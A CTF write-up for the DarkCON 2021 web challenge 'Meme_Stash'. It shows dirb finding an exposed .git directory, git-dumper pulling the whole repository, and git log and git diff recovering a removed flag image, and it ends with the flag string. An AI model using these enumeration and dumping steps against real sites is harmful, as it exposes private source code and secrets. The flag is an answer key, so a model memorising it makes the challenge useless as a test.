# DarkCON CTF 2021 – Meme_Stash

* **Category:** web
* **Points:** ?

## Challenge

> White Wolf cloned this website for some memes while browsing some memes he stumbled upon the flag but now he is not able to find it can you help him
> 
> Note: This chall does not require any brute forcing
> 
> http://meme-stash.darkarmy.xyz/

## Solution

A basic enumeration will reveal the presence of a Git repository.

```
root@m3ss4p0:~# dirb http://meme-stash.darkarmy.xyz/ /usr/share/dirb/wordlists/common.txt -z 200

http://meme-stash.darkarmy.xyz/.git/HEAD
```

So you can use [git-dumper](https://github.com/arthaud/git-dumper) to dump all the repository.

```
root@m3ss4p0:~/Tools/git-dumper# ./git-dumper.py http://meme-stash.darkarmy.xyz/.git/ ../../meme-stash
[-] Testing http://meme-stash.darkarmy.xyz/.git/HEAD [200]
[-] Testing http://meme-stash.darkarmy.xyz/.git/ [403]
[-] Fetching common files
[-] Fetching http://meme-stash.darkarmy.xyz/.git/description [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/commit-msg.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.gitignore [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/post-receive.sample [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/COMMIT_EDITMSG [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/post-commit.sample [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/post-update.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/pre-commit.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/pre-push.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/index [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/update.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/pre-receive.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/info/exclude [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/info/packs [404]
[-] Finding refs/
[-] Fetching http://meme-stash.darkarmy.xyz/.git/config [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/refs/remotes/origin/HEAD [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/FETCH_HEAD [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/HEAD [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/HEAD [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/ORIG_HEAD [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/info/refs [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/refs/stash [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/refs/remotes/origin/master [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/refs/heads/master [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/packed-refs [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/heads/master [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/heads/main [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/remotes/origin/master [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/stash [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/remotes/origin/main [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/wip/index/refs/heads/master [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/wip/wtree/refs/heads/master [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/refs/heads/main [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/refs/remotes/origin/main [404]
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/8f/e8fb21b73bceac61db2bcc7b72d31a9b564e6d [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/2c/dfab38e64a1a97e02d6bbe3801ca51d508aed2 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/74/7f8b0e2915bb6185848e2a27b6cb2e37be6d83 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/99/504cd1398a7f7ec3a5baaaa05e297c61c2189d [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/83/7cdbe893ac96998e2c5f523b906c519ec5005a [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/33/4ed6aeb833d46f81e5882b4c6f6712e9b071b9 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/2a/e8ba9e461f9c44f86fb9bdbfae9a2f82a1a032 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/5a/7136b7eb012e790511efa69e39326e4c569e22 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/74/3414208ede0f80fd5fd821e0756916378c8aba [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/3d/cdc9d93ab5b05228c3e4950d57a1c24751eb01 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/91/010559a7387a3b24d157a0e32acbd60339db00 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/14/6831302c94e3dfed16c9a90baed8770a82b544 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/a1/8518b0133ce59be487bd61a675a2130238ac98 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/dc/5774b462a1b9706538026cea32d72498ea8797 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/15/f0c294c29663d22ed07841bd0f863c79daf5a0 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/43/0b29a5542aaa222aff94b3c19bc80961aff64b [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/59/d72179a0ca8cc03132d6ce30c8ca4bc9ad3a34 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/e1/287a203c205104af6474d8ba188366653b772c [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/51/f6f6560cf4edd5f6f8b59c141c3dbce916a20b [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/d6/c0c5a409c9ec655a8dde53f1d998f723a90fcb [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/ee/bd2bb56a17352de1e6cc9b3aee66fe8a2cdb5e [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/2e/fb9de5b8bae537662db67ae959c828c95496b4 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/a0/ecc15b44e86be4472eec30a2947f568f00f5b0 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/ba/a389503d746fe8977f7f888ba72f280891e6bd [200]
[-] Running git checkout .
```

With `git log` you can discover a commit (i.e. `747f8b0e2915bb6185848e2a27b6cb2e37be6d83`) with a suspect message (i.e. `oops`). 

```
root@m3ss4p0:~/Tools/git-dumper# cd ../../meme-stash/meme-stash
root@m3ss4p0:~/meme-stash/meme_stash# git log
commit 747f8b0e2915bb6185848e2a27b6cb2e37be6d83 (HEAD -> main, origin/main, origin/HEAD)
Author: karma9874 <33444666+karma9874@users.noreply.github.com>
Date:   Wed Feb 3 16:45:49 2021 +0530

    oops

commit 146831302c94e3dfed16c9a90baed8770a82b544
Author: karma9874 <33444666+karma9874@users.noreply.github.com>
Date:   Wed Feb 3 16:44:57 2021 +0530

    added some memes xD

commit e1287a203c205104af6474d8ba188366653b772c
Author: karma9874 <33444666+karma9874@users.noreply.github.com>
Date:   Wed Feb 3 16:44:10 2021 +0530

    added js and css

commit eebd2bb56a17352de1e6cc9b3aee66fe8a2cdb5e
Author: karma9874 <33444666+karma9874@users.noreply.github.com>
Date:   Wed Feb 3 16:42:22 2021 +0530

    added html file
```

Probably the flag was present before that commit and has been removed. For this reason you can compare commits.

```
root@m3ss4p0:~/meme-stash/meme_stash# git diff 747f8b0e2915bb6185848e2a27b6cb2e37be6d83 146831302c94e3dfed16c9a90baed8770a82b544
diff --git a/index.html b/index.html
index 9101055..d6c0c5a 100644
--- a/index.html
+++ b/index.html
@@ -46,6 +46,10 @@
     <img src="meme_stash/9.jpg" >
   </div>
 
+  <div class="slide" style="background: #7edf10;">
+    <img src="meme_stash/flag.jpg" >
+  </div>
+
 
   <span class="controls" onclick="prevSlide(-1)" id="left-arrow"><i class="fa fa-arrow-left" aria-hidden="true"></i>
 </span>
@@ -54,7 +58,7 @@
 </div>
   <div id="dots-con">
  <span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span>
- <span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>
+ <span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span><span class="dot"></span>
  </div>
 
   <script  src="./script.js"></script>
diff --git a/meme_stash/flag.jpg b/meme_stash/flag.jpg
new file mode 100644
index 0000000..a0ecc15
Binary files /dev/null and b/meme_stash/flag.jpg differ
```

The previous commit (i.e. `146831302c94e3dfed16c9a90baed8770a82b544`) contained the flag. You can restore that file checking out the commit.

```
root@m3ss4p0:~/meme-stash/meme_stash# git checkout 146831302c94e3dfed16c9a90baed8770a82b544
root@m3ss4p0:~/meme-stash/meme_stash# ls
1.jpg  2.jpg  3.jpg  4.jpg  5.jpg  6.jpg  7.jpeg  8.jpeg  9.jpg  flag.jpg
```

![flag.jpg](flag.jpg)

The flag is the following.

```
darkCON{g1t_d4_fl4g}
```